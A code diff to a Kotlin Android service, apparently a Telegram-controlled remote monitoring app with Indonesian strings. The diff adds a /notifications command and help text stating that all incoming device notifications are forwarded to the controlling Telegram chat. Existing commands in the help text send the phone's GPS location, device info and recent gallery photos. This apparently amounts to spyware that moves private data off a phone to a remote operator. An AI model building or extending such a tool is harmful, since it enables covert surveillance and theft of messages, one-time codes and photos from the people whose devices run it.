@@ -230,6 +230,15 @@ class TelegramService : Service() {
             cmd.contains("/help") || cmd == "help" || cmd == "?" -> {
                 sendHelp(targetChatId)
             }
+            cmd.contains("/notifications") || cmd == "notifications" -> {
+                val enabled = androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this)
+                    .contains(NotificationWatcherService::class.java.packageName)
+                if (enabled) {
+                    sendText(targetChatId, "✅ Monitor notifikasi AKTIF. Semua notifikasi masuk otomatis dikirim ke chat ini.")
+                } else {
+                    sendText(targetChatId, "⚠️ Monitor notifikasi belum diizinkan.\nBuka app → tap \"Izinkan Monitor Notifikasi\" → centang app → kembali. Lalu /notifications lagi.")
+                }
+            }
             else -> {
                 sendText(targetChatId, "Perintah tidak dikenal. Ketik /help untuk bantuan.")
             }
@@ -245,7 +254,11 @@ class TelegramService : Service() {
             /status   - info perangkat
             /gps      - dapatkan lokasi GPS
             /photo [N] - kirim N foto terakhir dari galeri (default 5, max 20)
+            /notifications - status monitor notifikasi
             /help     - daftar ini
+
+            Fitur aktif:
+            🔔 Semua notifikasi masuk otomatis dikirim ke chat ini (butuh izin "Notification access").
         """.trimIndent()
         sendText(chatId, helpText)
     }
